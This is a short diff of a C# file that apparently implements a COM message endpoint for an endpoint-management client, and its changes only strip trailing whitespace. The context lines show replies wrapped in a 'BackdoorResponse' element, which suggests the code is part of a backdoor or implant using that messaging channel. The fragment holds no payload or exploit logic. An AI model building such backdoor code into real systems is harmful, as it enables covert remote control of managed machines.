@@ -36,9 +36,9 @@ public interface ICcmEndpoint {
 [Guid("d018cf0e-86a4-4573-a804-14a6f3621867")]
 [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
 public interface ICcmEndpointContext {
-    
+
     void _VtblGap1_1();
-    
+
     int SetComplete([In] int p0);
 }
 
@@ -165,9 +165,9 @@ public class CcmEndpoint : ICcmEndpoint
                 string replyTo = "";
                 message.GetTarget(out  target);
                 message.GetReplyTo(out replyTo);
-                
+
                 string replyBody = String.Format("<BackdoorResponse>{0}</BackdoorResponse>", respMsg );
-                
+
                 respMessage.SetTimeout((uint) 90);
                 respMessage.SetBodyWString(replyBody);
                 Guid guid = Guid.NewGuid();
@@ -185,9 +185,9 @@ public class CcmEndpoint : ICcmEndpoint
 
                 Marshal.ReleaseComObject(respMessage);
                 Marshal.ReleaseComObject(message);
-            
+
                 context.SetComplete(1);
-                
+
                 Marshal.ReleaseComObject(context);
                 Marshal.ReleaseComObject(service);
 
